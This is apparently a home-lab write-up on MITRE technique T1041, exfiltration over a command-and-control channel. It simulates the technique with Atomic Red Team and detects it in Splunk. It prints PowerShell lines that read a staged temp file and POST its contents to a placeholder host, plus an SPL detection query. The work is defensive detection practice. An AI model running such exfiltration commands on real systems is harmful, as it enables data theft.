# T1041 — Exfiltration Over C2 Channel

## What This Attack Does

After collecting and staging data, an attacker sends it out of the
network using the same channel they use to control the compromised
machine (their command-and-control, or C2, connection). Rather than
opening a separate connection just for stealing data, blending
exfiltration into existing C2 traffic makes it harder for defenders
to spot, since it looks like normal beacon traffic rather than a
distinct data transfer.

## How I Simulated It

Tool: Atomic Red Team
Command executed on Windows Server target: Invoke-AtomicTest T1041 -TestNumbers 1

Note: The test attempts to POST data to a placeholder domain
(`example.com`), which failed to resolve since this lab has no
internet access on the Windows host. The exfiltration attempt itself
was still fully generated and logged before failing at the network
level — the same outcome a real attacker would see if their C2
domain were sinkholed, blocked, or unreachable.

## What Splunk Captured

Sysmon Event ID 1 (Process Creation) fired showing the full
PowerShell script used to stage and attempt exfiltration:
- Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- User: `WINDOWS\khaled`
- ParentImage: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- CommandLine (key portion):
  `$filecontent = Get-Content -Path $env:TEMP\LineNumbers.txt`
  `Invoke-WebRequest -Uri example.com -Method POST -Body $filecontent -DisableKeepAlive`

## SPL Detection Query

```spl
index=* sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" "Invoke-WebRequest" "POST"
| rex field=_raw "Name='Image'>(?P<Image>[^<]+)"
| rex field=_raw "Name='CommandLine'>(?P<CommandLine>[^<]+)"
| rex field=_raw "Name='ParentImage'>(?P<ParentImage>[^<]+)"
| rex field=_raw "Name='User'>(?P<User>[^<]+)"
| rex field=_raw "Name='UtcTime'>(?P<UtcTime>[^<]+)"
| table UtcTime, User, Image, CommandLine, ParentImage
```

## Result

Splunk successfully detected the exfiltration attempt, capturing the
full PowerShell logic used to read staged data and POST it out via
`Invoke-WebRequest`. The outbound request failed to resolve at the
DNS level (no internet access, placeholder domain), but the attempt
itself was fully visible in process creation logs — demonstrating
that even failed exfiltration attempts leave a clear forensic trail.

## Screenshot
<img width="873" height="288" alt="T1041-windows png" src="https://github.com/user-attachments/assets/7b6c2893-02db-47c7-9df4-89e89ac306fa" />
<img width="1912" height="1026" alt="T1041-splunk png" src="https://github.com/user-attachments/assets/e71d3aaa-7205-46d0-a0cb-147e9a1d7868" />
